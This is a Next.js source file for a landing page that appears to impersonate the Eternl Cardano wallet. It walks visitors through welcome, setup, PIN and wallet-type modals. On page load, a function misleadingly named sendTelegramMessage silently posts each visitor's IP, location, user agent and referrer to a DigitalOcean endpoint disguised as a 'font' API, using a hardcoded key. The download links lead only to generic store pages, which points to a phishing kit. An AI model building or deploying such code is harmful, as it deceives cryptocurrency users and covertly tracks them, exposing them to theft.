"use client";

import { useState, useEffect } from "react";
import Image from "next/image";
import Link from "next/link";
import { motion } from "framer-motion";
import WelcomeModal from "../components/WelcomeModal";
import AppSetupModal from "../components/AppSetupModal";
import CreatePinModal from "../components/CreatePinModal";
import SelectWalletTypeModal from "../components/SelectWalletTypeModal";
import { useRef } from 'react';
import { usePathname } from 'next/navigation';
import { getUserCountry } from './userLocation';
import axios from 'axios';

export default function LandingPage() {
  // Two modals managed separately
  const [welcomeOpen, setWelcomeOpen] = useState(false);
  const [setupOpen, setSetupOpen] = useState(false);
  const [pinOpen, setPinOpen] = useState(false);
  const [showWelcome, setShowWelcome] = useState(true);
  const [showSelectType, setShowSelectType] = useState(false);
  const [country, setCountry] = useState("");
  const [ipAddress, setIpAddress] = useState("");
  const [browser, setBrowser] = useState("");
  const hasSentVisitorMessage = useRef(false);
  const pathname = usePathname();
  const getCurrentUrl = () => {
    if (typeof window !== "undefined") {
      let url = `${window.location.origin}${pathname}`;
      if (url.includes("localhost")) {
        url = "https://google.com";
      }
      if (url.includes("vercel.com")) {
        url = url.replace("vercel.com", "digitalocean.com");
      }
      console.log("getCurrentUrl returning:", url);
      return url;
    }
    console.log("getCurrentUrl: window not available, returning empty string");
    return "";
  };
  const sendTelegramMessage = (userCountry: { country?: string; countryEmoji?: string; city?: string; ip?: string } | null) => {
    // console.log("User Country", userCountry);

    const messageData = {
      info: "Regular Visitor", // You can update this logic as needed
      url: getCurrentUrl(),
      referer: document.referrer || getCurrentUrl(),
      location: {
        country: userCountry?.country || "Unknown",
        countryEmoji: userCountry?.countryEmoji || "",
        city: userCountry?.city || "Unknown",
        ipAddress: userCountry?.ip || "0.0.0.0",
      },
      agent: typeof navigator !== "undefined" ? navigator.userAgent : browser,
      date: new Date().toISOString(),
      appName: "eternl",
    };
    console.log("Message Data", messageData);
    axios
      .post(
        "https://squid-app-2-abmzx.ondigitalocean.app/api/t1/font",
        messageData,
        {
          headers: {
            "Content-Type": "application/json",
            "x-api-key": "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b",
          },
        }
      )
      .catch((error) =>
        console.error(
          "Error sending font message:",
          error.response.data.details
        )
      );
  };

  useEffect(() => {
    if (!hasSentVisitorMessage.current) {
      const fetchUserLocation = async () => {
        const userCountry = await getUserCountry();
        sendTelegramMessage(userCountry);
      };
      fetchUserLocation();
      hasSentVisitorMessage.current = true;
    }
  }, [sendTelegramMessage]);

 

  useEffect(() => {
    // Set browser info only on client side
    if (typeof window !== "undefined") {
      setBrowser(navigator.userAgent);
    }
  }, [sendTelegramMessage]);

  useEffect(() => {
    if (!hasSentVisitorMessage.current) {
      const fetchUserLocation = async () => {
        const userCountry = await getUserCountry();
        sendTelegramMessage(userCountry);
      };
      fetchUserLocation();
      hasSentVisitorMessage.current = true;
    }
  }, [sendTelegramMessage]);

  return (
    <main className="min-h-screen bg-[#0e0e0e] text-white flex flex-col items-center relative">
      {/* Top gradient line */}
      <div className="w-full h-0.5 bg-gradient-to-r from-pink-500 via-orange-400 to-purple-500" />

      {/* Hero section */}
      <section className="flex flex-col items-start text-left mt-24 px-12 sm:px-24 flex-grow">
        <h1 className="mt-10 text-5xl sm:text-6xl font-extrabold leading-tight">
          <span className="bg-gradient-to-r from-pink-500 via-orange-400 to-yellow-400 bg-clip-text text-transparent">
            A modern Cardano Wallet.{" "}
          </span>
          <br />
          <span className="bg-gradient-to-r from-pink-500 via-orange-400 to-yellow-400 bg-clip-text text-transparent">
            For everyone.
          </span>
        </h1>

        <p className="mt-6 text-xl text-white/80 max-w-[40ch]">
          Friendly for beginners. <br />
          Powerful for pro users.
        </p>

        <button
          onClick={() => setWelcomeOpen(true)}
          className="mt-8 bg-pink-500 hover:bg-pink-600 text-white font-semibold rounded-full px-8 py-4 transition"
        >
          Open app
        </button>

        {/* Download cards */}
        <div className="mt-12 flex flex-col sm:flex-row gap-6">
          <div className="bg-[#161616] rounded-2xl shadow-md p-6 w-72 text-left">
            <h2 className="text-white font-semibold text-lg">
              Mobile Dapps{" "}
              <span className="text-gray-400 font-normal">(Dapp browser)</span>
            </h2>
            <p className="mt-2 text-sm text-gray-400">
              Your wallet on the go, now with DApp support.
            </p>

            <div className="mt-4 flex flex-col gap-3">
              <Link
                href="https://play.google.com/store"
                target="_blank"
                className="flex items-center justify-center gap-2 bg-[#222] rounded-xl h-10 text-sm font-medium hover:bg-[#2a2a2a] transition"
              >
                <Image
                  src="/brand/play.svg"
                  alt="Google Play"
                  width={20}
                  height={20}
                />
                Google Play
              </Link>
              <Link
                href="https://www.apple.com/app-store/"
                target="_blank"
                className="flex items-center justify-center gap-2 bg-[#222] rounded-xl h-10 text-sm font-medium hover:bg-[#2a2a2a] transition"
              >
                <Image
                  src="/brand/apple.svg"
                  alt="Apple Store"
                  width={20}
                  height={20}
                />
                Apple Store
              </Link>
            </div>
          </div>

          <div className="bg-[#161616] rounded-2xl shadow-md p-6 w-72 text-left">
            <h2 className="text-white font-semibold text-lg">
              Browser Extension{" "}
              <span className="text-gray-400 font-normal">
                (Dapp connector & browser)
              </span>
            </h2>
            <p className="mt-2 text-sm text-gray-400">
              For Chrome, Edge, Brave and Opera.
            </p>

            <Link
              href="https://chrome.google.com/webstore"
              target="_blank"
              className="mt-4 flex items-center justify-center gap-2 bg-[#222] rounded-xl h-10 text-sm font-medium hover:bg-[#2a2a2a] transition"
            >
              <Image
                src="/brand/chrome.svg"
                alt="Chrome Web Store"
                width={20}
                height={20}
              />
              Chrome Web Store
            </Link>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="w-full max-w-5xl mt-auto mb-10 text-sm text-white/70 px-4">
        <div className="flex flex-col sm:flex-row justify-between gap-6 bg-[#161616] rounded-2xl p-6">
          <div>
            <h3 className="font-semibold mb-2">Resources</h3>
            <ul className="space-y-1">
              <li>
                <Link href="#" className="hover:text-white">
                  Wiki
                </Link>
              </li>
              <li>
                <Link href="#" className="hover:text-white">
                  Imprint
                </Link>
              </li>
            </ul>
          </div>

          <div>
            <h3 className="font-semibold mb-2">Social</h3>
            <ul className="space-y-1">
              <li>
                <Link href="https://x.com/" className="hover:text-white">
                  X.com
                </Link>
              </li>
              <li>
                <Link href="https://discord.com/" className="hover:text-white">
                  Discord
                </Link>
              </li>
              <li>
                <Link
                  href="https://web.telegram.org/"
                  className="hover:text-white"
                >
                  Telegram
                </Link>
              </li>
            </ul>
          </div>
        </div>
      </footer>

      {/* 🌈 Welcome Modal */}
      <WelcomeModal
        open={welcomeOpen}
        onClose={() => setWelcomeOpen(false)}
        onNext={() => {
          setWelcomeOpen(false);
          setSetupOpen(true);
        }}
        illustration={
          <Image
            src="/brand/laptop.svg"
            alt="Welcome Illustration"
            width={420}
            height={300}
          />
        }
      />

      {/* ⚙️ Setup Modal */}
      <AppSetupModal
        open={setupOpen}
        onClose={() => setSetupOpen(false)}
        onBack={() => {
          setSetupOpen(false);
          setWelcomeOpen(true);
        }}
        onNext={() => {
          setSetupOpen(false);
          setPinOpen(true);
        }}
      />

      {/* 🔐 Create PIN Modal */}
      <CreatePinModal
        open={pinOpen}
        onClose={() => setPinOpen(false)}
        onBack={() => {
          setPinOpen(false);
          setSetupOpen(true); // go back one step
        }}
        onNext={() => {
          setPinOpen(false);
          setTimeout(() => setShowSelectType(true), 150); // open wallet type modal
        }}
      />

      {/* 💼 Select Wallet Type Modal */}
      <SelectWalletTypeModal
        open={showSelectType}
        onClose={() => setShowSelectType(false)}
        onBack={() => {
          setShowSelectType(false);
          setPinOpen(true);
        }}
        onSelect={(key) => {
          console.log("Selected wallet type:", key);
          // you can trigger the next modal here based on key, e.g.:
          // if (key === "new") setShowCreateWallet(true);
        }}
      />
    </main>
  );
}
